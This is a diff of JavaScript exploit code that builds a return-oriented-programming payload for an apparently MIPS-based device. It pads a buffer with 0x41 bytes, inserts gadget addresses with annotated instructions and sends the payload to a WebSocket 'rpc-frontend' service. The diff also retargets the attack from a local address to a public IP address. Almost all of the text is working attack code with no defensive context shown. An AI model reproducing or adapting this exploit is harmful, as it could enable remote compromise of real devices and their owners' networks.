@@ -27,15 +27,13 @@ arr.fill(0x41)
 firstSp = 0x00
 previousSp = firstSp
 sp = previousSp+0xa0
-insertAt(arr, previousSp+0x94-1, [0xc2, 0x80, 0xce, 0x84, 0x74]) 
+insertAt(arr, previousSp+0x94-1, [0xc2, 0x80, 0xce, 0x84, 0x74])
 // 0x80ce8474: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
 
 previousSp = sp
 sp = previousSp+0x10
-insertAt(arr, previousSp-1, [0xf2, 0x80, 0x9e, 0x8e, 0xf0, 0x90, 0x80, 0x81]) 
+insertAt(arr, previousSp-1, [0xf2, 0x80, 0x9e, 0x8e, 0xf0, 0x90, 0x80, 0x81])
 //0x809e8ef0: addiu $a1, $zero, 1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
-
-
 
 var string = new TextDecoder("utf-8").decode(arr);
 
@@ -48,7 +46,7 @@ console.log(exploit)
 
 console.log(testEqual(arr, newArr));
 
-socket = new WebSocket("ws://192.168.100.1:8080/Frontend", 'rpc-frontend');
+socket = new WebSocket("ws://5.186.247.52:8080/Frontend", 'rpc-frontend');
 
 socket.onopen = function(e) {
     socket.send(exploit)
